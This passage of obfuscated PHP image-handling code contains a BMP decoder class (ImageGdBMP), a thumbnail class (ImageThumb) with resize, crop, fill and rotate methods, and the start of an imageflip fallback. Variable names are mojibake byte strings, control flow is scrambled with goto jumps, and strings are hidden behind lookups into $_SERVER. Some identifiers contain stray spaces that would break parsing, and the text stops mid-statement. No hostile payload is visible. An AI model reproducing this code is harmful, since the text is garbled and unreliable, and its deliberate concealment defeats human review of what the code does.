$E¨Š±ÜËñ»[33], $Bò‡Øé…Ï, $e®Ç‚š¯§); } } } return $bˆ»Š¢‘Ûµ; } } goto bÉ¿çƒä ; F¦ê—¹‘Ğ‘: class ImageGdBMP { public static function load($fŞ¶Àãñ‰´) { $EßøØ†º†Ÿ = fopen($fŞ¶Àãñ‰´, $_SERVER[îÖ][1515]); if ($EßøØ†º†Ÿ === !1) { return !1; } $EÇÏÎ¿¾¥¦ = self::loadFromStream($EßøØ†º†Ÿ); fclose($EßøØ†º†Ÿ); return $EÇÏÎ¿¾¥¦; } public static function loadFromStream($B¤˜ôâ•àĞ) { $AŒùå»È«Æ =& $_SERVER[îÖ]; $Bë²–’«Ì› = fread($B¤˜ôâ•àĞ, 14); if ($Bë²–’«Ì› === !1) { return !1; } if ($Bë²–’«Ì›[0] != $AŒùå»È«Æ[1826] || $Bë²–’«Ì›[1] != $AŒùå»È«Æ[1827]) { return !1; } $BªÔİ‚àó¤ = unpack($AŒùå»È«Æ[1828] . $AŒùå»È«Æ[1829] . $AŒùå»È«Æ[1830] . $AŒùå»È«Æ[1831] . $AŒùå»È«Æ[1832], $Bë²–’«Ì›); return self::loadFromStreamAndFileHeader($B¤˜ôâ•àĞ, $BªÔİ‚àó¤); } public static function loadFromStreamAndFileHeader($bòğã¤¼£Ø, array $Fµ‚Ÿá«àˆ) { goto a…²½óõ‡; c¨İÜ»Çæ›: if ($e…ÇĞè—Óè == 1 || $e…ÇĞè—Óè == 4 || $e…ÇĞè—Óè == 8) { goto EòÍ„©Á; EòÍ„©Á: $BÕå¢¸ÒÓ¶ = imagecreate($cô÷õÊ†‰, $b¼Ö»îÀâÑ); $bø ËÉİØÚ = $báÜíµ¡¶„ == 12 ? 3 : 4; $a’ŸŠáÈ­— = $a›„À Ö¾§ ? $a›„À Ö¾§ : pow(2, $e…ÇĞè—Óè); goto d°Ëó’²¤š; d°Ëó’²¤š: $e«Òè² õ§ = array(); for ($f¸™é½ÍÙç = 0; $f¸™é½ÍÙç < $a’ŸŠáÈ­—; ++$f¸™é½ÍÙç) { $AÊ•ŞğÚÆ = fread($bòğã¤¼£Ø, $bø ËÉİØÚ); if ($AÊ•ŞğÚÆ === !1) { imagedestroy($BÕå¢¸ÒÓ¶); return !1; } extract(unpack($C–…±ä´ù[1852], $AÊ•ŞğÚÆ . $C–…±ä´ù[1851])); $e«Òè² õ§[] = imagecolorallocate($BÕå¢¸ÒÓ¶, $e¨Î‡˜Ÿ¢, $aÄ­œ‡ÚÀæ, $CÍÉÙŠË¢); } $aéÉ¦¹‰Š = 8 - $e…ÇĞè—Óè; goto AÆ‹Ù½ïñÌ; AÆ‹Ù½ïñÌ: $a¢©ùŒÒ¯ = (1 << $e…ÇĞè—Óè) - 1 << $aéÉ¦¹‰Š; if ($aƒÓ›¤Óóó == 1 || $aƒÓ›¤Óóó == 2) { $F‹ä‰–¾éÅ = 0; $eÛŸÑ—†· = $e…ÇĞè—Óè >> 2 & 1; for (;;) { if ($F‹ä‰–¾éÅ < -1 || $F‹ä‰–¾éÅ > $cô÷õÊ†‰ || $EÅîÂ±†¬Î < -1 || $EÅîÂ±†¬Î > $a†§«ŒŒÙô) { imagedestroy($BÕå¢¸ÒÓ¶); return !1; } $AÊ•ŞğÚÆ = fread($bòğã¤¼£Ø, 1); if ($AÊ•ŞğÚÆ === !1) { imagedestroy($BÕå¢¸ÒÓ¶); return !1; } switch ($AÊ•ŞğÚÆ) { case $C–…±ä´ù[1851]: $AÊ•ŞğÚÆ = fread($bòğã¤¼£Ø, 1); if ($AÊ•ŞğÚÆ === !1) { imagedestroy($BÕå¢¸ÒÓ¶); return !1; } switch ($AÊ•ŞğÚÆ) { case $C–…±ä´ù[1851]: $EÅîÂ±†¬Î += $b´ÙáæÇ‰¿; $F‹ä‰–¾éÅ = 0; break; case $C–…±ä´ù[1853]: $EÅîÂ±†¬Î = 0; $F‹ä‰–¾éÅ = 0; break 3; case $C–…±ä´ù[1854]: $AÊ•ŞğÚÆ = fread($bòğã¤¼£Ø, 2); if ($AÊ•ŞğÚÆ === !1) { imagedestroy($BÕå¢¸ÒÓ¶); return !1; } list(, $cåâ“ƒêçÓ, $dàŠ ÊìŠ£) = unpack($C–…±ä´ù[1855], $AÊ•ŞğÚÆ); $F‹ä‰–¾éÅ += $cåâ“ƒêçÓ; $EÅîÂ±†¬Î += $dàŠ ÊìŠ£ * $b´ÙáæÇ‰¿; break; default: list(, $E·¨µ‹¤¥) = unpack($C–…±ä´ù[1856], $AÊ•ŞğÚÆ); $a¥ùâÕ®Š£ = ($E·¨µ‹¤¥ >> $eÛŸÑ—†·) + ($E·¨µ‹¤¥ & $eÛŸÑ—†·); $AÊ•ŞğÚÆ = fread($bòğã¤¼£Ø, $a¥ùâÕ®Š£ + 1 & ~1); if ($AÊ•ŞğÚÆ === !1) { imagedestroy($BÕå¢¸ÒÓ¶); return !1; } for ($f¸™é½ÍÙç = 0, $bøÄÃâ¨«Ğ = 0; $f¸™é½ÍÙç < $E·¨µ‹¤¥; ++$f¸™é½ÍÙç, ++$F‹ä‰–¾éÅ, $bøÄÃâ¨«Ğ += $e…ÇĞè—Óè) { list(, $böù„ğö …) = unpack($C–…±ä´ù[1856], $AÊ•ŞğÚÆ[$bøÄÃâ¨«Ğ >> 3]); $CÍÉÙŠË¢ = $bøÄÃâ¨«Ğ & 7; imagesetpixel($BÕå¢¸ÒÓ¶, $F‹ä‰–¾éÅ, $EÅîÂ±†¬Î, $e«Òè² õ§[($böù„ğö … & $a¢©ùŒÒ¯ >> $CÍÉÙŠË¢) >> $aéÉ¦¹‰Š - $CÍÉÙŠË¢]); } break; } break; default: $dëåÓÕˆ‚Ñ = fread($bòğã¤¼£Ø, 1); if ($dëåÓÕˆ‚Ñ === !1) { imagedestroy($BÕå¢¸ÒÓ¶); return !1; } list(, $f‘Ê»’¬¬‘, $böù„ğö …) = unpack($C–…±ä´ù[1855], $AÊ•ŞğÚÆ . $dëåÓÕˆ‚Ñ); for ($f¸™é½ÍÙç = 0, $bøÄÃâ¨«Ğ = 0; $f¸™é½ÍÙç < $f‘Ê»’¬¬‘; ++$f¸™é½ÍÙç, ++$F‹ä‰–¾éÅ, $bøÄÃâ¨«Ğ += $e…ÇĞè—Óè) { $CÍÉÙŠË¢ = $bøÄÃâ¨«Ğ & 7; imagesetpixel($BÕå¢¸ÒÓ¶, $F‹ä‰–¾éÅ, $EÅîÂ±†¬Î, $e«Òè² õ§[($böù„ğö … & $a¢©ùŒÒ¯ >> $CÍÉÙŠË¢) >> $aéÉ¦¹‰Š - $CÍÉÙŠË¢]); } break; } } } else { for ($cÅ…Ú¶®§’ = 0; $cÅ…Ú¶®§’ < $b¼Ö»îÀâÑ; ++$cÅ…Ú¶®§’, $EÅîÂ±†¬Î += $b´ÙáæÇ‰¿) { $AÊ•ŞğÚÆ = fread($bòğã¤¼£Ø, $d“¾¹½ Ò—); if ($AÊ•ŞğÚÆ === !1) { imagedestroy($BÕå¢¸ÒÓ¶); return !1; } $bøÄÃâ¨«Ğ = 0; for ($F‹ä‰–¾éÅ = 0; $F‹ä‰–¾éÅ < $cô÷õÊ†‰; ++$F‹ä‰–¾éÅ, $bøÄÃâ¨«Ğ += $e…ÇĞè—Óè) { list(, $böù„ğö …) = unpack($C–…±ä´ù[1856], $AÊ•ŞğÚÆ[$bøÄÃâ¨«Ğ >> 3]); $CÍÉÙŠË¢ = $bøÄÃâ¨«Ğ & 7; imagesetpixel($BÕå¢¸ÒÓ¶, $F‹ä‰–¾éÅ, $EÅîÂ±†¬Î, $e«Òè² õ§[($böù„ğö … & $a¢©ùŒÒ¯ >> $CÍÉÙŠË¢) >> $aéÉ¦¹‰Š - $CÍÉÙŠË¢]); } } } goto DŒ…èâäª; DŒ…èâäª: } else { goto D‚ÜÆÆİñÇ; fœ½¸î÷»: $B×Ò†¦ø±¹ = $e…ÇĞè—Óè >> 3; $Eˆ¢³ëŸ‹à = $BÜ¬™ØÏ°¶ ? 127 : 0; $bñÎÍÚ¿„ = $BÜ¬™ØÏ°¶ ? 1 / $BÜ¬™ØÏ°¶ : 1; goto d±´±¬À³Æ; d±´±¬À³Æ: $FÁ¹š¶ìÜë = $fÆ›öÖĞ’‘ ? 1 / $fÆ›öÖĞ’‘ : 1; $e¡°À× è’ = $DÅ·É­äçÎ ? 1 / $DÅ·É­äçÎ : 1; $aŸ£ß÷Û–¬ = $f™©Ù„¨¯‡ ? 1 / $f™©Ù„¨¯‡ : 1; goto Aî‚ÇÙõ’; Aî‚ÇÙõ’: for ($cÅ…Ú¶®§’ = 0; $cÅ…Ú¶®§’ < $b¼Ö»îÀâÑ; ++$cÅ…Ú¶®§’, $EÅîÂ±†¬Î += $b´ÙáæÇ‰¿) { $AÊ•ŞğÚÆ = fread($bòğã¤¼£Ø, $d“¾¹½ Ò—); if ($AÊ•ŞğÚÆ === !1) { imagedestroy($BÕå¢¸ÒÓ¶); return !1; } $bøÄÃâ¨«Ğ = 0; for ($F‹ä‰–¾éÅ = 0; $F‹ä‰–¾éÅ < $cô÷õÊ†‰; ++$F‹ä‰–¾éÅ, $bøÄÃâ¨«Ğ += $B×Ò†¦ø±¹) { list(, $böù„ğö …) = unpack($C–…±ä´ù[1833], substr($AÊ•ŞğÚÆ, $bøÄÃâ¨«Ğ, $B×Ò†¦ø±¹) . $C–…±ä´ù[1857]); $cîèª¡Ò = $böù„ğö … & $BÜ¬™ØÏ°¶; $d¾ß„Õçá˜ = $böù„ğö … & $fÆ›öÖĞ’‘; $BŞ·Š‘‚Ï­ = $böù„ğö … & $DÅ·É­äçÎ; $CˆÆÙøîÉÂ = $böù„ğö … & $f™©Ù„¨¯‡; $e†è¾àæ© = $Eˆ¢³ëŸ‹à - (($cîèª¡Ò << 7) - $cîèª¡Ò) * $bñÎÍÚ¿„; $e¨Î‡˜Ÿ¢ = (($d¾ß„Õçá˜ << 8) - $d¾ß„Õçá˜) * $FÁ¹š¶ìÜë; $aÄ­œ‡ÚÀæ = (($BŞ·Š‘‚Ï­ << 8) - $BŞ·Š‘‚Ï­) * $e¡°À× è’; $CÍÉÙŠË¢ = (($CˆÆÙøîÉÂ << 8) - $CˆÆÙøîÉÂ) * $aŸ£ß÷Û–¬; imagesetpixel($BÕå¢¸ÒÓ¶, $F‹ä‰–¾éÅ, $EÅîÂ±†¬Î, $e†è¾àæ© << 24 | $e¨Î‡˜Ÿ¢ << 16 | $aÄ­œ‡ÚÀæ << 8 | $CÍÉÙŠË¢); } } imagealphablending($BÕå¢¸ÒÓ¶, !0); goto e®¾Úµ‰ù; D‚ÜÆÆİñÇ: $BÕå¢¸ÒÓ¶ = imagecreatetruecolor($cô÷õÊ†‰, $b¼Ö»îÀâÑ); imagealphablending($BÕå¢¸ÒÓ¶, !1); if ($BÜ¬™ØÏ°¶) { imagesavealpha($BÕå¢¸ÒÓ¶, !0); } goto fœ½¸î÷»; e®¾Úµ‰ù: } return $BÕå¢¸ÒÓ¶; goto bŞÃ®š„½Ê; a­í©ÒÒ: if ($cô÷õÊ†‰ == 0 || $a†§«ŒŒÙô == 0 || $aÍ²¥ŞÆŒ¥ != 1 || ($BÜ¬™ØÏ°¶ & $fÆ›öÖĞ’‘) != 0 || ($BÜ¬™ØÏ°¶ & $DÅ·É­äçÎ) != 0 || ($BÜ¬™ØÏ°¶ & $f™©Ù„¨¯‡) != 0 || ($fÆ›öÖĞ’‘ & $DÅ·É­äçÎ) != 0 || ($fÆ›öÖĞ’‘ & $f™©Ù„¨¯‡) != 0 || ($DÅ·É­äçÎ & $f™©Ù„¨¯‡) != 0) { return !1; } if ($aƒÓ›¤Óóó == 4 || $aƒÓ›¤Óóó == 5) { $AÊ•ŞğÚÆ = stream_get_contents($bòğã¤¼£Ø, $bñóĞŸçŞ); if ($AÊ•ŞğÚÆ === !1) { return !1; } return imagecreatefromstring($AÊ•ŞğÚÆ); } $d“¾¹½ Ò— = $cô÷õÊ†‰ * $e…ÇĞè—Óè + 31 >> 3 & ~3; goto bÜ—ÑÀˆ; a…²½óõ‡: $C–…±ä´ù =& $_SERVER[îÖ]; if ($Fµ‚Ÿá«àˆ[$C–…±ä´ù[388]] != 19778) { return !1; } $AÊ•ŞğÚÆ = fread($bòğã¤¼£Ø, 4); goto Aø×±çÀğ²; bÜ—ÑÀˆ: $b¼Ö»îÀâÑ = abs($a†§«ŒŒÙô); $EÅîÂ±†¬Î = $a†§«ŒŒÙô > 0 ? $b¼Ö»îÀâÑ - 1 : 0; $b´ÙáæÇ‰¿ = $a†§«ŒŒÙô > 0 ? -1 : 1; goto c¨İÜ»Çæ›; Aø×±çÀğ²: if ($AÊ•ŞğÚÆ === !1) { return !1; } list(, $báÜíµ¡¶„) = unpack($C–…±ä´ù[1833], $AÊ•ŞğÚÆ); if ($báÜíµ¡¶„ == 12) { goto F‹©‚‡Ş¬„; F‹©‚‡Ş¬„: $AÊ•ŞğÚÆ = fread($bòğã¤¼£Ø, $báÜíµ¡¶„ - 4); if ($AÊ•ŞğÚÆ === !1) { return !1; } extract(unpack($C–…±ä´ù[1834] . $C–…±ä´ù[1835] . $C–…±ä´ù[1836] . $C–…±ä´ù[1837], $AÊ•ŞğÚÆ)); goto aİºµ–ÜÂ; aİºµ–ÜÂ: $a›„À Ö¾§ = $a¸Œ‘ëƒ¸õ = $BÜ¬™ØÏ°¶ = $aƒÓ›¤Óóó = 0; $fÆ›öÖĞ’‘ = 16711680; $DÅ·É­äçÎ = 65280; goto a³éÙŒ™œ; a³éÙŒ™œ: $f™©Ù„¨¯‡ = 255; goto BÅ‘µ–ÄĞÈ; BÅ‘µ–ÄĞÈ: } else { if (124 < $báÜíµ¡¶„ || $báÜíµ¡¶„ < 40) { return !1; } else { goto e…™èğªÙÇ; dß°ì¯ƒµ¥: if ($cô÷õÊ†‰ & 2147483648) { $cô÷õÊ†‰ = -(~$cô÷õÊ†‰ & 4294967295) - 1; } if ($a†§«ŒŒÙô & 2147483648) { $a†§«ŒŒÙô = -(~$a†§«ŒŒÙô & 4294967295) - 1; } if ($D­”’ò…« & 2147483648) { $D­”’ò…« = -(~$D­”’ò…« & 4294967295) - 1; } goto a´İŞ§•; e…™èğªÙÇ: $AÊ•ŞğÚÆ = fread($bòğã¤¼£Ø, 36); if ($AÊ•ŞğÚÆ === !1) { return !1; } extract(unpack($C–…±ä´ù[1838] . $C–…±ä´ù[1839] . $C–…±ä´ù[1836] . $C–…±ä´ù[1840] . $C–…±ä´ù[1841] . $C–…±ä´ù[1842] . $C–…±ä´ù[1843] . $C–…±ä´ù[1844] . $C–…±ä´ù[1845] . $C–…±ä´ù[1846], $AÊ•ŞğÚÆ)); goto dß°ì¯ƒµ¥; Bâí´ÓÚÂ•: if (($e…ÇĞè—Óè == 16 || $e…ÇĞè—Óè == 24 || $e…ÇĞè—Óè == 32) && $aƒÓ›¤Óóó == 0 && $fÆ›öÖĞ’‘ == 0 && $DÅ·É­äçÎ == 0 && $f™©Ù„¨¯‡ == 0) { switch ($e…ÇĞè—Óè) { case 16: $fÆ›öÖĞ’‘ = 31744; $DÅ·É­äçÎ = 992; $f™©Ù„¨¯‡ = 31; break; case 24: case 32: $fÆ›öÖĞ’‘ = 16711680; $DÅ·É­äçÎ = 65280; $f™©Ù„¨¯‡ = 255; break; } } goto DŸƒÖÒñà©; a´İŞ§•: if ($Bæ×šâÛ‰ & 2147483648) { $Bæ×šâÛ‰ = -(~$Bæ×šâÛ‰ & 4294967295) - 1; } if ($Fµ‚Ÿá«àˆ[$C–…±ä´ù[520]] != 0) { $cÏÀ„ ÃÍ = $e…ÇĞè—Óè == 1 || $e…ÇĞè—Óè == 4 || $e…ÇĞè—Óè == 8 ? ($a›„À Ö¾§ ? $a›„À Ö¾§ : pow(2, $e…ÇĞè—Óè)) << 2 : 0; $B±ÆŠ±˜÷« = $bñóĞŸçŞ ? $bñóĞŸçŞ : ($cô÷õÊ†‰ * $e…ÇĞè—Óè + 31 >> 3 & ~3) * abs($a†§«ŒŒÙô); $bË›š­Òš² = $Fµ‚Ÿá«àˆ[$C–…±ä´ù[520]] - $B±ÆŠ±˜÷« - $cÏÀ„ ÃÍ - 14; if ($báÜíµ¡¶„ < $bË›š­Òš² && 40 <= $báÜíµ¡¶„ && $báÜíµ¡¶„ <= 124) { $báÜíµ¡¶„ = $bË›š­Òš²; } } if ($báÜíµ¡¶„ - 40 > 0) { $AÊ•ŞğÚÆ = fread($bòğã¤¼£Ø, $báÜíµ¡¶„ - 40); if ($AÊ•ŞğÚÆ === !1) { return !1; } extract(unpack($C–…±ä´ù[1847] . $C–…±ä´ù[1848] . $C–…±ä´ù[1849] . $C–…±ä´ù[1850], $AÊ•ŞğÚÆ . str_repeat($C–…±ä´ù[1851], 120))); } else { $BÜ¬™ØÏ°¶ = $fÆ›öÖĞ’‘ = $DÅ·É­äçÎ = $f™©Ù„¨¯‡ = 0; } goto Bâí´ÓÚÂ•; DŸƒÖÒñà©: } } goto a­í©ÒÒ; bŞÃ®š„½Ê: } } class ImageThumb { var $srcFile = ''; var $imgData = ''; var $echoType; var $im = ''; var $srcW = ''; var $srcH = ''; function __construct($aËÈÙĞĞÂí, $dã²°˜Íò) { goto d¤“¯¢©; BÑ¶èí¡±: if (!$this->im) { return !1; } $FÚÈ§‚ ŞÕ = $_SERVER[îÖ][33]; $this->imgData = GetImageSize($aËÈÙĞĞÂí, $FÚÈ§‚ ŞÕ); goto B¹Š“¬·§¶; d¤“¯¢©: $this->srcFile = $aËÈÙĞĞÂí; $this->echoType = $dã²°˜Íò; $this->im = self::image($aËÈÙĞĞÂí); goto BÑ¶èí¡±; B¹Š“¬·§¶: $this->srcW = imageSX($this->im); $this->srcH = imageSY($this->im); return $this; goto eøíÅó…ÓÚ; eøíÅó…ÓÚ: } public static function image($BÊÔÎâ‘‘) { $Eï‘»ĞõË¼ =& $_SERVER[îÖ]; $A…¿©³‡¢Ö = $Eï‘»ĞõË¼[33]; $c×¼†‡‡°¸ = GetImageSize($BÊÔÎâ‘‘, $A…¿©³‡¢Ö); $d¥˜Ş¯—İ = !1; switch ($c×¼†‡‡°¸[2]) { case IMAGETYPE_GIF: if (!function_exists($Eï‘»ĞõË¼[1858])) { break; } $d¥˜Ş¯—İ = imagecreatefromgif($BÊÔÎâ‘‘); break; case IMAGETYPE_JPEG: if (!function_exists($Eï‘»ĞõË¼[1859])) { break; } $d¥˜Ş¯—İ = imagecreatefromjpeg($BÊÔÎâ‘‘); break; case IMAGETYPE_PNG: if (!function_exists($Eï‘»ĞõË¼[1860])) { break; } $d¥˜Ş¯—İ = @imagecreatefrompng($BÊÔÎâ‘‘); imagesavealpha($d¥˜Ş¯—İ, !0); break; case IMAGETYPE_XBM: $d¥˜Ş¯—İ = imagecreatefromxbm($BÊÔÎâ‘‘); break; case IMAGETYPE_WBMP: $d¥˜Ş¯—İ = imagecreatefromwbmp($BÊÔÎâ‘‘); break; case IMAGETYPE_BMP: $d¥˜Ş¯—İ = imagecreatefrombmp($BÊÔÎâ‘‘); break; default: break; } return $d¥˜Ş¯—İ; } public static function imageSize($BŞëƒÕ›Ôá) { $C‘„¥÷á =& $_SERVER[îÖ]; $cø®ŠØÏ¡é = GetImageSize($BŞëƒÕ›Ôá); if (!$cø®ŠØÏ¡é) { return !1; } return array($C‘„¥÷á[1861] => $cø®ŠØÏ¡é[0], $C‘„¥÷á[1862] => $cø®ŠØÏ¡é[1]); } function distortion($bùµà¡ù , $C¡ÜĞ¬©Í‚, $Eãá¨Ó‚ö) { $b²÷ëë¢”ø = $this->creatImage($this->im, $C¡ÜĞ¬©Í‚, $Eãá¨Ó‚ö, 0, 0, 0, 0, $this->srcW, $this->srcH); return $this->echoImage($b²÷ëë¢”ø, $bùµà¡ù ); } function prorate($F¸‹Ó£ëÀ¡, $CÄó¶‘ê®Ş, $eÆ‡­¾ˆŠ) { $AªŠë•Ìø’ = $CÄó¶‘ê®Ş / $eÆ‡­¾ˆŠ; $f‘ÚæÄ´éÒ = $this->srcW / $this->srcH; if ($AªŠë•Ìø’ <= $f‘ÚæÄ´éÒ) { $C¿‰…¹¾† = $CÄó¶‘ê®Ş; $FªÅå ëì« = $C¿‰…¹¾† * ($this->srcH / $this->srcW); } else { $FªÅå ëì« = $eÆ‡­¾ˆŠ; $C¿‰…¹¾† = $FªÅå ëì« * ($this->srcW / $this->srcH); } if ($this->srcW > $CÄó¶‘ê®Ş || $this->srcH > $eÆ‡­¾ˆŠ) { $dÒò©†Û»¤ = $this->creatImage($this->im, $C¿‰…¹¾†, $FªÅå ëì«, 0, 0, 0, 0, $this->srcW, $this->srcH); return $this->echoImage($dÒò©†Û»¤, $F¸‹Ó£ëÀ¡); } else { $dÒò©†Û»¤ = $this->creatImage($this->im, $this->srcW, $this->srcH, 0, 0, 0, 0, $this->srcW, $this->srcH); return $this->echoImage($dÒò©†Û»¤, $F¸‹Ó£ëÀ¡); } } function cut($Bğâ·äÅ¹Ø, $f£‘à¦Ã²Ï, $D¯Ñí‰°ïª) { goto dÚ¡ï…¶‡ç; dÚ¡ï…¶‡ç: $c‰ƒßŞ‘£ = $f£‘à¦Ã²Ï / $D¯Ñí‰°ïª; $cŠµÂÁóä = $this->srcW / $this->srcH; if ($c‰ƒßŞ‘£ <= $cŠµÂÁóä) { $B­ğ´¬´¥ˆ = $D¯Ñí‰°ïª; $Dª®šÀŠ“È = $B­ğ´¬´¥ˆ * ($this->srcW / $this->srcH); } else { $Dª®šÀŠ“È = $f£‘à¦Ã²Ï; $B­ğ´¬´¥ˆ = $Dª®šÀŠ“È * ($this->srcH / $this->srcW); } goto aÍ‹’“øîâ; aœŠ‘¤Ï©: return $this->echoImage($F”‡ŞË¸ , $Bğâ·äÅ¹Ø); goto E²ŠØô—¦ê; aÍ‹’“øîâ: $c¢É—ù‚Ğ = $this->creatImage($this->im, $Dª®šÀŠ“È, $B­ğ´¬´¥ˆ, 0, 0, 0, 0, $this->srcW, $this->srcH); $F”‡ŞË¸  = $this->creatImage($c¢É—ù‚Ğ, $f£‘à¦Ã²Ï, $D¯Ñí‰°ïª, 0, 0, ($Dª®šÀŠ“È - $f£‘à¦Ã²Ï) / 2, ($B­ğ´¬´¥ˆ - $D¯Ñí‰°ïª) / 2, $f£‘à¦Ã²Ï, $D¯Ñí‰°ïª); imageDestroy($c¢É—ù‚Ğ); goto aœŠ‘¤Ï©; E²ŠØô—¦ê: } function backFill($bõî´ˆÌº¶, $fÕ¦­ëØø‚, $c´†°Ï½’À, $B´ŒºˆàÉ = false, $b±õÀ´Î‰ç = 255, $C—äÆ”Ùó‚ = 255, $dİîŒĞÁ¶Š = 255) { goto c’ä¼¥íŸ; FøÆãÃîËÚ: if ($B´ŒºˆàÉ) { $CÕ‰ÈĞóÊ = imageColorTransparent($BÀ°¶ òãÌ, $CÕ‰ÈĞóÊ); $Eƒ”È¾«‚ = $c´†°Ï½’À - $FĞä ñìç; } imageFilledRectangle($BÀ°¶ òãÌ, 0, 0, $fÕ¦­ëØø‚, $c´†°Ï½’À, $CÕ‰ÈĞóÊ); if ($this->srcW > $fÕ¦­ëØø‚ || $this->srcH > $c´†°Ï½’À) { $e„Úô‰îÅ¢ = $this->creatImage($this->im, $EÚë„¤©Îù, $FĞä ñìç, 0, 0, 0, 0, $this->srcW, $this->srcH); if ($EÚë„¤©Îù < $fÕ¦­ëØø‚) { imageCopy($BÀ°¶ òãÌ, $e„Úô‰îÅ¢, ($fÕ¦­ëØø‚ - $EÚë„¤©Îù) / 2, 0, 0, 0, $EÚë„¤©Îù, $FĞä ñìç); } else { if ($FĞä ñìç < $c´†°Ï½’À) { imageCopy($BÀ°¶ òãÌ, $e„Úô‰îÅ¢, 0, $Eƒ”È¾«‚, 0, 0, $EÚë„¤©Îù, $FĞä ñìç); } else { imageCopy($BÀ°¶ òãÌ, $e„Úô‰îÅ¢, 0, 0, 0, 0, $EÚë„¤©Îù, $FĞä ñìç); } } } else { imageCopyMerge($BÀ°¶ òãÌ, $this->im, ($fÕ¦­ëØø‚ - $EÚë„¤©Îù) / 2, $Eƒ”È¾«‚, 0, 0, $EÚë„¤©Îù, $FĞä ñìç, 100); } goto fğİ³Ú¶„ï; fğİ³Ú¶„ï: return $this->echoImage($BÀ°¶ òãÌ, $bõî´ˆÌº¶); goto eÁ¾×§Š‚; a—Ø²š™ˆÑ: if (function_exists($_SERVER[îÖ][1863])) { @($BÀ°¶ òãÌ = imageCreateTrueColor($fÕ¦­ëØø‚, $c´†°Ï½’À)); if (!$BÀ°¶ òãÌ) { $BÀ°¶ òãÌ = imageCreate($fÕ¦­ëØø‚, $c´†°Ï½’À); } } else { $BÀ°¶ òãÌ = imageCreate($fÕ¦­ëØø‚, $c´†°Ï½’À); } $Eƒ”È¾«‚ = ($c´†°Ï½’À - $FĞä ñìç) / 2; $CÕ‰ÈĞóÊ = imagecolorallocate($BÀ°¶ òãÌ, $b±õÀ´Î‰ç, $C—äÆ”Ùó‚, $dİîŒĞÁ¶Š); goto FøÆãÃîËÚ; c’ä¼¥íŸ: $dÇ×èÚ² = $fÕ¦­ëØø‚ / $c´†°Ï½’À; $A‘‡ä¤•áÕ = $this->srcW / $this->srcH; if ($dÇ×èÚ² <= $A‘‡ä¤•áÕ) { $EÚë„¤©Îù = $fÕ¦­ëØø‚; $FĞä ñìç = $EÚë„¤©Îù * ($this->srcH / $this->srcW); } else { $FĞä ñìç = $c´†°Ï½’À; $EÚë„¤©Îù = $FĞä ñìç * ($this->srcW / $this->srcH); } goto a—Ø²š™ˆÑ; eÁ¾×§Š‚: } function creatImage($C¡¿íù¹Ş, $bÉ¢™ÆÂ¥µ, $C¦Óçï˜§›, $EÉöôµ‚ , $eãÄØíÕ‡, $Cç¥½ïÂ®, $cß²²½êáŞ, $A‰…àœ–¦, $F‘åñÈÖ†) { if (function_exists($_SERVER[îÖ][1863])) { @($DÈ“²°åÚ = ImageCreateTrueColor($bÉ¢™ÆÂ¥µ, $C¦Óçï˜§›)); @imagealphablending($DÈ“²°åÚ, !1); @imagesavealpha($DÈ“²°åÚ, !0); if ($DÈ“²°åÚ) { imageCopyResampled($DÈ“²°åÚ, $C¡¿íù¹Ş, $EÉöôµ‚ , $eãÄØíÕ‡, $Cç¥½ïÂ®, $cß²²½êáŞ, $bÉ¢™ÆÂ¥µ, $C¦Óçï˜§›, $A‰…àœ–¦, $F‘åñÈÖ†); } else { $DÈ“²°åÚ = ImageCreate($bÉ¢™ÆÂ¥µ, $C¦Óçï˜§›); imageCopyResized($DÈ“²°åÚ, $C¡¿íù¹Ş, $EÉöôµ‚ , $eãÄØíÕ‡, $Cç¥½ïÂ®, $cß²²½êáŞ, $bÉ¢™ÆÂ¥µ, $C¦Óçï˜§›, $A‰…àœ–¦, $F‘åñÈÖ†); } } else { $DÈ“²°åÚ = ImageCreate($bÉ¢™ÆÂ¥µ, $C¦Óçï˜§›); imageCopyResized($DÈ“²°åÚ, $C¡¿íù¹Ş, $EÉöôµ‚ , $eãÄØíÕ‡, $Cç¥½ïÂ®, $cß²²½êáŞ, $bÉ¢™ÆÂ¥µ, $C¦Óçï˜§›, $A‰…àœ–¦, $F‘åñÈÖ†); } return $DÈ“²°åÚ; } public function imgRotate($fÄÎÖäì, $f¤­÷¹Ëª) { goto dÔğ°’‚‰ä; CĞ’Å¼¾êà: return $cÛï°œÎ¾; goto c‹ÚÙÌÙ –; dÔğ°’‚‰ä: if (!$this->im || $f¤­÷¹Ëª % 360 === 0 || !function_exists($_SERVER[îÖ][1864])) { return !1; } $cİ×‘­¦Ÿ = imageRotate($this->im, 360 - $f¤­÷¹Ëª, 0); $cÛï°œÎ¾ = !1; goto A”Š‡çåÂ; A”Š‡çåÂ: switch ($this->imgData[2]) { case IMAGETYPE_GIF: $cÛï°œÎ¾ = imagegif($cİ×‘­¦Ÿ, $fÄÎÖäì); break; case IMAGETYPE_JPEG: $cÛï°œÎ¾ = imagejpeg($cİ×‘­¦Ÿ, $fÄÎÖäì, 100); break; case IMAGETYPE_PNG: $cÛï°œÎ¾ = imagePNG($cİ×‘­¦Ÿ, $fÄÎÖäì); break; default: break; } imageDestroy($cİ×‘­¦Ÿ); imageDestroy($this->im); goto CĞ’Å¼¾êà; c‹ÚÙÌÙ –: } function echoImage($bóìæŠßêÄ, $fñ™‚Ğ¾ÚÒ) { goto e¡·í–œâ½; e¡·í–œâ½: $eÎ¦„ø¼ß‚ =& $_SERVER[îÖ]; if (!$bóìæŠßêÄ) { return !1; } ob_get_clean(); goto AÛ´Ü±‘Ÿº; f°®í“¼: imageDestroy($this->im); return $CÀö¦šé—Ò; goto dŠ…í¤èà·; AÛ´Ü±‘Ÿº: $CÀö¦šé—Ò = !1; switch ($this->echoType) { case $eÎ¦„ø¼ß‚[1865]: $CÀö¦šé—Ò = imagePNG($bóìæŠßêÄ); break; case $eÎ¦„ø¼ß‚[167]: $CÀö¦šé—Ò = imagePNG($bóìæŠßêÄ, $fñ™‚Ğ¾ÚÒ); break; } imageDestroy($bóìæŠßêÄ); goto f°®í“¼; dŠ…í¤èà·: } } if (!function_exists($_SERVER[îÖ][1866])) { define($_SERVER[îÖ][1867], 0); define($_SERVER[îÖ][1868], 1); define($_SERVER[îÖ][1869], 2); function imageflip($EÄóíÀ…Ó…, $f †øšÉÁ·) { switch ($f †øšÉÁ·) { case IMG_FLIP_HORIZONTAL: $dÄèØßÊ½ = imagesx($EÄóíÀ…Ó…) - 1; $fĞ«ëÀ²Œ­ = $dÄèØßÊ½ / 2; $B¼İç„è¥ = imagesy($EÄóíÀ…Ó…); $fĞ•¯ãˆŒ = imageistruecolor($EÄóíÀ…Ó…) ? imagecreatetruecolor(1, $B¼İç„è¥) : imagecreate(1, 